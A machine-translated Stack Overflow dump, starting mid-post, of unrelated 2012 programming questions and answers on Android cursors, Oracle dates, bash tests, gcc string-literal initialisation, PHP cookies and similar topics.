11-21 14:49:33.604: E/AndroidRuntime(1721): java.lang.RuntimeException: Unable to resume activity {com.example.shaktitool/com.example.shaktitool.Product}: java.lang.IllegalStateException: trying to requery an already closed cursor  android.database.sqlite.SQLiteCursor@41334490
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2575)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.app.ActivityThread.handleResumeActivity(ActivityThread.java:2603)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1237)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.os.Handler.dispatchMessage(Handler.java:99)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.os.Looper.loop(Looper.java:137)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.app.ActivityThread.main(ActivityThread.java:4745)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at java.lang.reflect.Method.invokeNative(Native Method)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at java.lang.reflect.Method.invoke(Method.java:511)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at dalvik.system.NativeStart.main(Native Method)
11-21 14:49:33.604: E/AndroidRuntime(1721): Caused by: java.lang.IllegalStateException: trying to requery an already closed cursor  android.database.sqlite.SQLiteCursor@41334490
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.app.Activity.performRestart(Activity.java:5051)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.app.Activity.performResume(Activity.java:5074)
11-21 14:49:33.604: E/AndroidRuntime(1721):     at android.app.ActivityThread.performResumeActivity(ActivityThread.java:2565)
11-21 14:49:33.604: E/AndroidRuntime(1721):     ... 10 more 
```

My Java Code:

```
package com.example.shaktitool;
    import android.app.Activity;
    import android.content.Intent;
    import android.database.Cursor;
    import android.os.Bundle;
    import android.view.KeyEvent;
    import android.view.View;
    import android.widget.AdapterView;
    import android.widget.AdapterView.OnItemClickListener;
    import android.widget.ListView;
    import android.widget.SimpleCursorAdapter;

    public class Product extends Activity {

    protected static final String PRODUCT_REQUEST = null;

    private SQLiteAdapterPro mySQLiteAdapter;

        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.product);

            Intent intent = getIntent();

            ListView list = (ListView)findViewById(R.id.content_list);

            /*
             *  Create/Open a SQLite database
             *  and fill with dummy content
             *  and close it
             */
            mySQLiteAdapter = new SQLiteAdapterPro(this);
            mySQLiteAdapter.openToWrite();
            mySQLiteAdapter.deleteAll();

            mySQLiteAdapter.insert("ELECTRONICS-COMPUTERS");
            mySQLiteAdapter.insert("DESKTOPS");
            mySQLiteAdapter.insert("NOTEBOOKS");

            mySQLiteAdapter.close();

            /*
             *  Open the same SQLite database
             *  and read all it's content.
             */
            mySQLiteAdapter = new SQLiteAdapterPro(this);
            mySQLiteAdapter.openToRead();

            Cursor cursor = mySQLiteAdapter.queueAll();
            startManagingCursor(cursor);

            String[] from = new String[]{SQLiteAdapter.KEY_CONTENT};
            int[] to = new int[]{R.id.text};

            SimpleCursorAdapter cursorAdapter =
                new SimpleCursorAdapter(this, R.layout.row, cursor, from, to);

            list.setAdapter(cursorAdapter);

            list.setOnItemClickListener( new OnItemClickListener() {

                public void onItemClick(AdapterView<?> arg0, View arg1,
                        int position, long arg3) {

                    switch(position){

                    case 1 : Intent intent = new Intent(Product.this, Desktop.class);
                             startActivity(intent);

                             break;

                    case 2 : Intent intent1 = new Intent(Product.this, Notebook.class);
                             startActivity(intent1);

                             break;                        

                    }
                }   
            });

            mySQLiteAdapter.close();

        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:09:51.903

> trying to requery an already closed cursor android.database.sqlite.SQLiteCursor@41334490

You are trying to access a Cursor that is already closed.

Don't close the cursor if you still need it or make a new DB query to get another one.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:12:30.540

The error is clear.

> java.lang.IllegalStateException: trying to requery an already closed cursor.

Its hard to tell how you are queuing the cursor which you have already closed. But one guess is you may be using startManagingCursor() and passing it already closed cursor.

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-21T10:09:50.360

**First:** your should read the FAQ of StackOverflow.

**Second:** by reading your logcat I understand that:

```
java.lang.RuntimeException: Unable to resume activity {com.example.shaktitool/com.example.shaktitool.Product}: java.lang.IllegalStateException: trying to requery an already closed cursor  android.database.sqlite.SQLiteCursor@41334490

Caused by: java.lang.IllegalStateException: trying to requery an already closed cursor  android.database.sqlite.SQLiteCursor@41334490 
```

**So:** `trying to requery an already closed cursor` means that you do something wrong with SQLite. Post your java code and you'll get help.

# expressionengine - Exp:resso Store 一般问题

> ID：13490778
> 
> 赞同：2
> 
> 时间：2012-11-21T10:06:40.957
> 
> 标签：expressionengine, expresso-store

我已尝试联系 Exp:resso 商店支持，询问有关他们的 ExpressionEngine 商店插件的一些问题，但没有收到任何回复，我真的需要开始我的新在线商店项目。我只是想知道以下几点：

是否支持 Paypal 网站付款标准？

可以在没有额外 EE 附加组件（例如频道图像）的情况下将多个图像添加到产品中吗？

产品可以属于多个类别吗？

可以将以下类型的折扣应用于购物车吗？如果没有，我将如何写这个？我猜我可以将产品添加到特定的折扣类别，然后在购物车中添加一些逻辑来检查是否添加了 x 数量的产品，但有没有更简单的方法？

我看到客人结账是可能的，但如果是这样，客户如何在不根据 Exp:resso 商店网站登录的情况下安全地查看他们的订单详细信息？

如果有人能够提供帮助，请提前感谢！

麦克风

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T23:06:52.053

> 是否支持 Paypal 网站付款标准？

支持 Paypal Express，与 Paypal Standard 具有相同的用户体验，但更可靠。

> 可以在没有额外 EE 附加组件（例如频道图像）的情况下将多个图像添加到产品中吗？

商店不会影响您管理图像的方式，这取决于您。您可以使用通道图像、矩阵字段、常规 EE 文件字段等。

> 产品可以属于多个类别吗？

是的，Store 再次与您管理产品的方式无关。这是标准的 EE 功能。

> 可以将以下类型的折扣应用于购物车吗？如果没有，我将如何写这个？我猜我可以将产品添加到特定的折扣类别，然后在购物车中添加一些逻辑来检查是否添加了 x 数量的产品，但有没有更简单的方法？

Devotee 上有一个[批量折扣扩展](http://devot-ee.com/add-ons/store-bulk-discount)，声称添加了此功能（我没有亲自尝试过）。

> 我看到客人结账是可能的，但如果是这样，客户如何在不根据 Expresso 商店网站登录的情况下安全地查看他们的订单详细信息？

Store 生成一个安全的随机 URL（称为“订单哈希”），可以在其中显示订单详细信息。您可以将此链接通过电子邮件发送给您的客户，以便他们无需登录即可查看。

# ios - 哪个是在 iOS 中解码 Jpeg 的最快库？

> ID：13490784
> 
> 赞同：2
> 
> 时间：2012-11-21T10:07:07.113
> 
> 标签：ios, jpeg, decode

我正在编写一个图像管理应用程序。

我想尽可能快地打开一个 jpeg 及其缩略图。所以用户可以享受查看他们的图像。

在 IOS 中解码 Jpeg 的最快库是哪个？

我曾经使用 IJL 并以 1/8 大小解码图像，它在 PC 中非常快。iOS 中是否有类似 IJL 的 lib？</p>

非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:20:49.447

您可以编译和使用 libjpeg (http://www.ijg.org/)。

要快速打开缩略图，请设置`scale_num`和`scale_denom`值：

```
jpeg_decompress_struct * cinfo_;
/// .....
cinfo_->scale_num = 1;
cinfo_->scale_denom = 8; // open photo in 1/8 size 
```

# c# - 使用我的 Windows 窗体应用程序部署数据库

> ID：13490788
> 
> 赞同：0
> 
> 时间：2012-11-21T10:07:22.730
> 
> 标签：c#, mysql

我制作了一个 RSS 阅读器 winform 应用程序，它使用 mysql 数据库来存储 url。如果我发布应用程序，设置在我的计算机上运行良好，因为我的计算机中有 MySQL 和数据库。但是如何使用我的应用程序部署 Mysql 数据库？安装我的应用程序的人是否也需要安装 MySQL，还是有其他方法可以解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:10:42.267

你应该尝试包含一个 sql 脚本来创建你需要的数据库和表。这样每个将使用您的应用程序的人只需输入他的登录数据以获取 mysql 数据库。因此，您的应用程序无需安装完整的 mysql。通常，数据库不必与应用程序位于同一系统上。

# sql - Oracle：字符串到日期时间

> ID：13490789
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:07:26.177
> 
> 标签：sql, datetime

如何在 oracle 中将此字符串日期转换为日期时间：

2012 年 3 月 20 日，星期二

我试过 `to_char('Tuesday, March 20, 2012', 'dd/mm/yyyy')` 但它抛出了`Invalid number error`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:15:10.367

为了从字符串转换为日期时间，您应该使用[to_date](http://www.techonthenet.com/oracle/functions/to_date.php)函数。我认为，但尚未测试，以下格式应该适合您：

```
to_date('Tuesday, March 20, 2012', 'DAY, MONTH DD, YYYY')) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:11:55.160

尝试：

```
TO_DATE('Tuesday, March 20, 2012', 'DAY, MONTH dd, yyyy') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:12:09.330

尝试这个

TO_DATE('2012 年 3 月 20 日，星期二'，'日，月 dd，yyyy')

# email - 如何在 Racket 中发送带有电子邮件的附件？

> ID：13490790
> 
> 赞同：5
> 
> 时间：2012-11-21T10:07:26.707
> 
> 标签：email, smtp, lisp, scheme, racket

我查看了[net/smtp](http://docs.racket-lang.org/net/smtp.html)模块，它提供了几个发送电子邮件的功能。但是，它没有说明包含附件的任何内容。我还使用 Racket 文档网站上的搜索功能来查找单词“attach”，但没有返回任何相关内容。

我已经搜索和搜索，但无济于事。那么，如何在 Racket 中将文件附加到电子邮件中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T03:35:45.237

Sirmail 会这样做，我相信： [https ://github.com/mflatt/sirmail](https://github.com/mflatt/sirmail)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:18:14.757

电子邮件附件使用 MIME。

不幸的是，似乎没有内置模块可以进行 MIME 编码。（有一个 ,`net/mime`用于进行 MIME 解码。）

我也搜索了 PLaneT，在那里，最近的库是`bzlib/mime`，但没有它的文档，所以我不能告诉你它是否能完成这项工作。

# python - 继续通读NUL

> ID：13490794
> 
> 赞同：1
> 
> 时间：2012-11-21T10:07:37.237
> 
> 标签：python, string, file, nul

我有一个 .dat 文件，用 ANSI 编码，其中包含 NUL 字符（不仅！）。

我不想将它读入 str 对象中，iot 在获得的整个 str 中剪切了一些东西。

但`file.read()`在达到第一个 NUL 时停止。

我迷路了 ：）

我的代码：

```
file=open(source, mode='rt')
fulltext=file.read()
print(fulltext) 
```

NUL 用 Notepad++ 显示 我在 Windows XP 上，使用 PortablePython 3.2 该文件是一个特殊的 DAT 文件，可以用记事本作为文本进行编辑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:30:31.347

如果你想读取字节`0`，很可能你的文件是二进制文件。以二进制模式`rb`而不是文本模式读取`rt`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T12:58:54.283

正如 Evert 在我的问题中所评论的那样，问题集中在 Pyscripter 的使用上！所以，这个问题已经结束了:)

# bash - 解释这个 bash 脚本

> ID：13490796
> 
> 赞同：-5
> 
> 时间：2012-11-21T10:07:40.580
> 
> 标签：bash, shell, unix

谁能告诉我这个脚本会做什么？第 3 行的 -z 是什么？

```
 Filename=File.txt
  X=`ls /home/$Filename`
  if [ -z "$X" ]; then
  exit
  fi 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:13:30.153

```
Filename=File.txt 
```

该`$Filename`变量现在具有值`File.txt`。

```
X=`ls /home/$Filename` 
```

该`$X`变量现在包含命令的输出`ls /home/File.txt`。如果文件存在，它将包含一些东西，否则它将是一个空字符串。

```
if [ -z "$X" ]; then 
```

如果变量的值`$X`是一个空字符串（意思是`/home/File.txt`不存在，否则`$X`会包含一些东西），那么：

```
 exit
fi 
```

* * *

这是一种很尴尬的写法：

```
if ! [ -e "/home/File.txt" ]; then exit; fi 
```

`-e`如果路径存在，则返回 true。您还可以检查文件 ( `-f`)、目录 ( `-d`)、符号链接 ( `-L`) 等。查看`man [`更多可与`[`. 您还可以`-z`在那里找到：

> `-z string` 如果 的长度`string`为零，则为真。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T10:09:30.577

脚本的作用是

创建一个名为 Filename 的变量 Filename 的值是 File.txt 执行命令 ls File.txt 将结果分配给变量 X 然后检查变量 X 中值的长度是否为零 如果它为零脚本将退出 所以基本上你的程序所做的是，它检查文件是否存在

而不是所有这些行，你可以使用

```
if [ -a "$Filename"] 
```

此链接将对您有所帮助

[http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_07_01.html](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_07_01.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:10:26.490

它测试是否`/home/File.txt`存在，如果不存在，则`exit`. 但这不是一个理想的解决方案，最好这样写：

```
if ! test -e /home/File.txt; then exit; fi 
```

* * *

```
$ help test
test: test [expr]
    Evaluate conditional expression.

    Exits with a status of 0 (true) or 1 (false) depending on
    the evaluation of EXPR.  Expressions may be unary or binary.  Unary
    expressions are often used to examine the status of a file.  There
    are string operators and numeric comparison operators as well.

    The behavior of test depends on the number of arguments.  Read the
    bash manual page for the complete specification.

    File operators:

      -a FILE        True if file exists.
      -b FILE        True if file is block special.
      -c FILE        True if file is character special.
      -d FILE        True if file is a directory.
      -e FILE        True if file exists.
      -f FILE        True if file exists and is a regular file.
      -g FILE        True if file is set-group-id.
      -h FILE        True if file is a symbolic link.
      -L FILE        True if file is a symbolic link.
      -k FILE        True if file has its `sticky' bit set.
      -p FILE        True if file is a named pipe.
      -r FILE        True if file is readable by you.
      -s FILE        True if file exists and is not empty.
      -S FILE        True if file is a socket.
      -t FD          True if FD is opened on a terminal.
      -u FILE        True if the file is set-user-id.
      -w FILE        True if the file is writable by you.
      -x FILE        True if the file is executable by you.
      -O FILE        True if the file is effectively owned by you.
      -G FILE        True if the file is effectively owned by your group.
      -N FILE        True if the file has been modified since it was last read.

      FILE1 -nt FILE2  True if file1 is newer than file2 (according to
                       modification date).

      FILE1 -ot FILE2  True if file1 is older than file2.

      FILE1 -ef FILE2  True if file1 is a hard link to file2.

    String operators:

      -z STRING      True if string is empty.

      -n STRING
         STRING      True if string is not empty.

      STRING1 = STRING2
                     True if the strings are equal.
      STRING1 != STRING2
                     True if the strings are not equal.
      STRING1 < STRING2
                     True if STRING1 sorts before STRING2 lexicographically.
      STRING1 > STRING2
                     True if STRING1 sorts after STRING2 lexicographically.

    Other operators:

      -o OPTION      True if the shell option OPTION is enabled.
      -v VAR     True if the shell variable VAR is set
      ! EXPR         True if expr is false.
      EXPR1 -a EXPR2 True if both expr1 AND expr2 are true.
      EXPR1 -o EXPR2 True if either expr1 OR expr2 is true.

      arg1 OP arg2   Arithmetic tests.  OP is one of -eq, -ne,
                     -lt, -le, -gt, or -ge.

    Arithmetic binary operators return true if ARG1 is equal, not-equal,
    less-than, less-than-or-equal, greater-than, or greater-than-or-equal
    than ARG2.

    Exit Status:
    Returns success if EXPR evaluates to true; fails if EXPR evaluates to
    false or an invalid argument is given. 
```

# ios - GPUImageMovieWriter 和 avfiletypempeg4 文件类型

> ID：13490798
> 
> 赞同：3
> 
> 时间：2012-11-21T10:07:44.903
> 
> 标签：ios, avfoundation, gpuimage

首先，我要祝贺 Brad 在 GPUImage 上的出色工作。

我正在尝试对给定的视频文件应用旋转并获取 mpeg4 (AVFileTypeMPEG4) 文件作为输出。

执行此操作时，我收到以下消息：

***** -[AVAssetWriterInput appendSampleBuffer:] 当 outputSettings 不为 nil 时，输入缓冲区必须为未压缩格式****

 **使用以下文件类型设置为 AVFileTypeMPEG4 的 GPUImageMovieWriter 的 init 方法时会出现此问题：

```
- (id)initWithMovieURL:(NSURL *)newMovieURL size:(CGSize)newSize fileType:(NSString *)newFileType outputSettings:(NSMutableDictionary *)outputSettings; 
```

然而，它适用于另一个 init 方法，它实际上生成了 quicktime 电影（默认设置为 AVFileTypeQuickTimeMovie）。

```
- (id)initWithMovieURL:(NSURL *)newMovieURL size:(CGSize)newSize; 
```

如果 GPUImageWriter 从现在开始能够输出 mpeg4 电影文件，请有人告诉我。

经过多次调查和尝试，您可以在下面看到我制作的几个代码之一。

```
movieFile = [[GPUImageMovie alloc] initWithURL:inputUrl];
movieFilter = [[GPUImageBrightnessFilter alloc] init];
[movieFilter setInputRotation:videoRotationMode atIndex:0];
[movieFile addTarget:movieFilter];
unlink([[outputUrl path] UTF8String]); // If a file already exists, AVAssetWriter won't let you record new frames, so delete the old movie

NSMutableDictionary *videoSettings = [[NSMutableDictionary alloc] init];;
[videoSettings setObject:AVVideoCodecH264 forKey:AVVideoCodecKey];
[videoSettings setObject:[NSNumber numberWithInteger:width] forKey:AVVideoWidthKey];
[videoSettings setObject:[NSNumber numberWithInteger:height] forKey:AVVideoHeightKey];

AudioChannelLayout channelLayout;
memset(&channelLayout, 0, sizeof(AudioChannelLayout));
channelLayout.mChannelLayoutTag = kAudioChannelLayoutTag_Stereo;

NSDictionary *audioSettings = [NSDictionary dictionaryWithObjectsAndKeys:
                                [ NSNumber numberWithInt: kAudioFormatMPEG4AAC], AVFormatIDKey,
                                [ NSNumber numberWithInt: 2 ], AVNumberOfChannelsKey,
                                [ NSNumber numberWithFloat: 16000.0 ], AVSampleRateKey,
                                [ NSData dataWithBytes:&channelLayout length: sizeof( AudioChannelLayout ) ], AVChannelLayoutKey,
                                [ NSNumber numberWithInt: 32000 ], AVEncoderBitRateKey,
                                nil];

// Will create quicktime file
movieWriter = [[GPUImageMovieWriter alloc] initWithMovieURL:outputUrl size:CGSizeMake(640.0, 480.0) fileType:AVFileTypeMPEG4 outputSettings:videoSettings];

[movieFilter addTarget:movieWriter];
// Configure this for video from the movie file, where we want to preserve all video frames and audio samples
movieWriter.shouldPassthroughAudio = NO; // default YES
[movieWriter setHasAudioTrack:TRUE audioSettings:audioSettings];
movieFile.audioEncodingTarget = movieWriter;
[movieFile enableSynchronizedEncodingUsingMovieWriter:movieWriter];

[movieWriter setDelegate:self];
[movieWriter startRecording];
[movieFile startProcessing]; 
```

提前致谢

PS：我用的是iOS6**

# c# - 如何将word doc的字节数组转换为pdf的字节数组

> ID：13490799
> 
> 赞同：-4
> 
> 时间：2012-11-21T10:07:47.663
> 
> 标签：c#, sql, pdf

我在 Sql Server 数据库中有 word 文档，我需要阅读它并转换为 PDF 文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:12:12.733

我通常讨厌只发布答案的链接，但由于这个答案仍然比你的问题长，我会破例：

[https://stackoverflow.com/a/608153/131809](https://stackoverflow.com/a/608153/131809)

# c++ - python或C++中良好的开源后缀树实现

> ID：13490801
> 
> 赞同：1
> 
> 时间：2012-11-21T10:07:49.443
> 
> 标签：c++, python, data-structures, tree, suffix-tree

我正在寻找具有模仿 python 字典的友好 API 的后缀树实现：

```
import SubstringDict
d = SubstringDict.SubstringDict()
d['foobar'] = 1  
d['barfoo'] = 2
d['forget'] = 3
d['arfbag'] = 4
d['a']
>>> [1, 2, 4]
d['arf']
>>> [2, 4]
d['oo']
>>> [1, 2]
d['food']
>>> [] 
```

我从这个网站上举了这个例子：[Python 中的后缀树](https://hkn.eecs.berkeley.edu/~dyoo/python/suffix_trees/) 你可能会问：“你为什么不使用网站上的实现？” 好吧，显然它在 python 绑定中有一些内存泄漏，所以我不能将它与我的大型（120 万个字符串，大约 200 MB）数据集一起使用。

我什至会对使用以下 API 的 C++ 实现（我可以自己编写 python 绑定）感到满意：

```
SuffixTree<int> sf = SuffixTrie<int>();
sf['foobar'] = 1;
sf['barfoo'] = 2;
sf['forget'] = 3;

assetTrue(sf.find('a')==std::vector<int>({1,2})) 
```

有什么提示吗？

# java - JSession Id 由浏览器或服务器创建的概念证明

> ID：13490804
> 
> 赞同：1
> 
> 时间：2012-11-21T10:07:57.963
> 
> 标签：java, apache, http, tomcat, jsessionid

> **可能重复：**
> [在什么条件下创建 JSESSIONID？](https://stackoverflow.com/questions/595872/under-what-conditions-is-a-jsessionid-created)

**谁为会话创建 JSession Id：浏览器还是服务器？** 根据以下链接： [http](http://www.webdeveloper.com/forum/showthread.php?77388-who-creates-the-session-id-client-or-server) ://www.webdeveloper.com/forum/showthread.php?77388-who-creates- the-session-id-client-or-server 服务器也负责。任何人都可以提供一些 POC（概念证明）吗？（例如：一些创建 JSession ID 的类的代码片段）

# c++ - 为什么 gcc 允许使用大于数组的字符串文字初始化 char 数组？

> ID：13490805
> 
> 赞同：19
> 
> 时间：2012-11-21T10:07:58.070
> 
> 标签：c++, c, compiler-errors, string-literals, arrays

```
int main()
{
    char a[7] = "Network";
    return 0;
} 
```

C 中的**字符串文字**在内部以**nul 字符**结尾。因此，上面的代码应该给出一个编译错误，因为字符串文字的实际长度`Network`是 8 并且它不能放入`char[7]`数组中。

但是， Ubuntu 上的**gcc**（即使带有`-Wall`）编译此代码时不会出现任何错误或警告。为什么 gcc 允许这样做而不将其标记为编译错误？

当 char 数组大小小于字符串文字时，gcc 只会发出警告（仍然没有错误！）。例如，它会警告：

```
char a[6] = "Network"; 
```

[相关] **Visual C++ 2012**给出以下编译错误`char a[7]`：

```
1>d:\main.cpp(3): error C2117: 'a' : array bounds overflow
1> d:\main.cpp(3) : see declaration of 'a' 
```

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-11-21T10:12:42.210

用大于 C 的字符串字面量初始化 char 数组是可以的，但在 C++ 中是错误的。这解释了 gcc 和 VC++ 之间的行为差​​异。

如果您使用 VC++ 编译为 C 文件，则不会出错。如果使用 g++ 将其编译为 C++ 文件，则会出现错误。

C标准说：

> 字符类型的数组可以由字符串文字或 UTF-8 字符串文字初始化，可选地用大括号括起来。字符串文字的连续字节（如果有空间或数组大小未知，则包括终止的空字符）初始化数组的元素。
> 
> *[...]*
> 
> 例 8
> 
> 宣言
> 
> ```
> char s[] = "abc", t[3] = "abc"; 
> ```
> 
> 定义 ''plain'' 字符数组对象`s`，`t`其元素用字符串字面量初始化。此声明与
> 
> ```
> char s[] = { 'a', 'b', 'c', '\0' },
>      t[] = { 'a', 'b', 'c' }; 
> ```

*（[C11 标准草案](http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf)第 6.7.9 节，最终标准中的实际措辞可能有所不同。）*

这意味着如果数组没有空间放置终止字符，则删除它是完全正确的。这可能是出乎意料的，但这正是该语言应该如何工作的，并且是（至少对我而言）众所周知的功能。

相反，C++ 标准说：

> 初始化器的个数不得多于数组元素的个数。
> 
> 例子：
> 
> ```
>  char cv[4] = "asdf"; // error 
> ```
> 
> 格式不正确，因为没有用于隐含尾随 '\0' 的空间。

*（C++ 2011 草案[n3242](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2011/n3242.pdf)的 8.5.2 。）*

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-21T10:20:59.957

在 C 和 Unix 的早期，内存和磁盘都很小，因此不在字符串末尾存储 NUL 字节实际上是一种使用的技术。如果字符串变量有 7 个字符长，您可以在其中存储一个 7 个字符的字符串，并且由于 7 是最大长度，您知道字符串到此结束，即使没有终止符。这就是**strncpy**以它的方式工作的原因。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-22T16:58:11.937

虽然[unwind 的回答](https://stackoverflow.com/a/13490908/14558)解释了为什么`gcc`不对此发出警告，但它并没有说明你能做些什么。

`gcc`的`-Wc++-compat`警告选项将通过以下消息检测此特定问题：

```
foo.c: In function ‘main’:
foo.c:3:17: warning: initializer-string for array chars is too long for C++ [-Wc++-compat] 
```

这是唯一会导致`gcc`警告此问题的选项。您可以编写一个简短的脚本来快速 grep 的`gcc`手册页中的警告选项，尝试使用每个选项进行编译，看看它是否有问题。

```
$ time for F in $(man gcc | grep -o -- '-W[^= ]*')
    do if gcc -c "${F}" foo.c |& grep :3 >& /dev/null; then
         echo "${F}"; gcc -c "${F}" foo.c
    fi
  done
man gcc | grep -o -- '-W[^= ]*')
man gcc | grep -o -- '-W[^= ]*'
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wc++-compat
foo.c: In function ‘main’:
foo.c:3:17: warning: initializer-string for array chars is too long for C++ [-Wc++-compat]
-Wunused
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused-variable
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wtraditional
foo.c: In function ‘main’:
foo.c:3:5: warning: traditional C rejects automatic aggregate initialization [-Wtraditional]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused-variable
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused-variable
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wunused
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wtraditional
foo.c: In function ‘main’:
foo.c:3:5: warning: traditional C rejects automatic aggregate initialization [-Wtraditional]
-Wtraditional
foo.c: In function ‘main’:
foo.c:3:5: warning: traditional C rejects automatic aggregate initialization [-Wtraditional]
-Wc++-compat
foo.c: In function ‘main’:
foo.c:3:17: warning: initializer-string for array chars is too long for C++ [-Wc++-compat]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wtraditional
foo.c: In function ‘main’:
foo.c:3:5: warning: traditional C rejects automatic aggregate initialization [-Wtraditional]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wall
foo.c: In function ‘main’:
foo.c:3:10: warning: unused variable ‘a’ [-Wunused-variable]
-Wtraditional
foo.c: In function ‘main’:
foo.c:3:5: warning: traditional C rejects automatic aggregate initialization [-Wtraditional]

real    0m26.399s
user    0m5.128s
sys 0m15.329s 
```

* * *

一般来说，类似[lint](http://en.wikipedia.org/wiki/Lint_(software))的工具[`splint`](http://www.splint.org/) 会警告您各种潜在问题。在这种情况下，它会说：

```
foo.c:3:17: String literal with 8 characters is assigned to char [7] (no room
               for null terminator): "Network"
  A string literal is assigned to a char array that is not big enough to hold
  the null terminator. (Use -stringliteralnoroom to inhibit warning)
foo.c:3:10: Variable a declared but not used 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-21T10:15:53.747

声明字符串文字的首选方式通常是：

```
 char a[] = "Network";
   printf("size of a: %d\n", sizeof a); // The compiler 'knows' the size of a.
   // this prints '8' 
```

让编译器弄清楚。手动指定数组大小并使其与字符串文字的实际长度保持同步很麻烦......

所以我猜GCC除了警告之外并没有真正打扰任何事情。

# php - Cookies中的日期（）

> ID：13490816
> 
> 赞同：0
> 
> 时间：2012-11-21T10:08:32.967
> 
> 标签：php, cookies

我想在 Cookies 中放入一些 Date() 值，以后我想在其他页面中使用相同的数据。我做错了什么，我不明白什么是问题？

```
<?php
$value = date('d-m-Y H:i:s');
setcookie("DATENEW", $value, time()+3600*24);
echo $HTTP_COOKIE_VARS["DATENEW"];
?> 
```

非常感谢您的建议和指导！先感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:18:23.310

